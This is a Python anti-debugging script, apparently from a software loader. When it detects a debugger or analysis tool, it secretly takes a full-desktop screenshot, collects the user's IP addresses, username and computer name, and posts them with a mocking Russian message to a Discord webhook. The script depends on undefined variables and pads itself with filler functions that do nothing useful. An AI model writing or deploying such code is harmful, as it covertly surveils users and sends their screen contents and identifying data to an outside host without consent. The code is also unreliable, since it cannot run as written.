import os
import requests
import zipfile
import subprocess
import uuid
import platform
import sys
import ctypes
import psutil
import socket
import json
import random
import string
from datetime import datetime
from urllib.parse import urlparse
from requests.exceptions import RequestException
from PIL import ImageGrab

DEBUGGER_PROCESSES = [
    "ollydbg.exe", "idaq.exe", "idaq64.exe", "x32dbg.exe", "x64dbg.exe",
    "windbg.exe", "gdb.exe", "httpdebugger.exe", "fiddler.exe", "wireshark.exe",
    "cheatengine-x86_64.exe", "cheatengine-i386.exe"
]

def is_debugger_present():
    return ctypes.windll.kernel32.IsDebuggerPresent() != 0

def check_tracing():
    return sys.gettrace() is not None

def check_debugger_processes():
    for proc in psutil.process_iter(['name']):
        try:
            if proc.info['name'].lower() in [d.lower() for d in DEBUGGER_PROCESSES]:
                return proc.info['name']
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            continue
    return None

def take_screenshot():
    screenshot_path = os.path.join(TEMP_DIR, "screenshot.png")
    screenshot = ImageGrab.grab()
    screenshot.save(screenshot_path, "PNG")
    return screenshot_path

def get_local_ip():
    try:
        return socket.gethostbyname(socket.gethostname())
    except:
        return "Не удалось определить локальный IP"

def get_external_ip():
    try:
        return requests.get("https://api.ipify.org").text
    except RequestException:
        return "Не удалось определить внешний IP"

def get_computer_name():
    return socket.gethostname()

def send_to_discord(hwid, password, login, debugger=None, screenshot_path=None):
    payload = {
        "embeds": [{
            "title": "Найден мамкин крякер! Лоадер успешно закрыт!",
            "color": 0xFF0000,
            "fields": [
                {"name": "HWID", "value": hwid, "inline": False},
                {"name": "Login", "value": login, "inline": False},
                {"name": "Password", "value": password, "inline": False}
            ]
        }],
        "content": "||@everyone||"
    }
    if debugger:
        payload["embeds"][0]["fields"].extend([
            {"name": "Найденный дебаггер", "value": debugger, "inline": False},
            {"name": "Локальный IP", "value": get_local_ip(), "inline": False},
            {"name": "Внешний IP", "value": get_external_ip(), "inline": False},
            {"name": "Имя пользователя", "value": USERNAME, "inline": False},
            {"name": "Имя компьютера", "value": get_computer_name(), "inline": False},
            {"name": "Время обнаружения", "value": datetime.now().strftime("%Y-%m-%d %H:%M:%S"), "inline": False}
        ])

    if screenshot_path:
        with open(screenshot_path, "rb") as f:
            files = {"file": ("screenshot.png", f)}
            requests.post(DISCORD_WEBHOOK_URL, data={"payload_json": json.dumps(payload)}, files=files)
    else:
        requests.post(DISCORD_WEBHOOK_URL, json=payload)

def anti_debug():
    if is_debugger_present() or check_tracing():
        debugger = "API Debug Detection"
    else:
        debugger = check_debugger_processes()
    
    if debugger:
        hwid = get_hwid()
        screenshot_path = take_screenshot()
        send_to_discord(hwid, "N/A", "N/A", debugger, screenshot_path)
        if os.path.exists(JSON_PATH):
            pass  # Add logic here if needed
        sys.exit(0)

def check_integrity():
    # Example usage of zipfile and urlparse
    test_zip = 'test.zip'
    url = 'https://example.com/test.zip'
    url_components = urlparse(url)
    with zipfile.ZipFile(test_zip, 'w') as zipf:
        zipf.writestr('test.txt', 'This is a test file.')

def protect_memory():
    try:
        process = psutil.Process(os.getpid())
        for _ in range(11):
            random_data = ''.join(random.choices(string.ascii_letters, k=1000))
            ctypes.c_char_p(random_data.encode())
    except:
        pass

def get_hwid():
    return str(uuid.uuid4())

def example_usage():
    # Example usages of imported modules
    print("Platform:", platform.system())
    print("Python version:", sys.version)
    print("UUID:", uuid.uuid4())
    print("Local IP:", get_local_ip())
    print("External IP:", get_external_ip())
    print("Computer Name:", get_computer_name())

    # Example subprocess usage
    result = subprocess.run(['echo', 'Hello, World!'], capture_output=True, text=True)
    print("Subprocess result:", result.stdout)

    # Example JSON usage
    data = {"name": "John", "age": 30}
    json_data = json.dumps(data)
    print("JSON data:", json_data)

anti_debug()
check_integrity()
protect_memory()
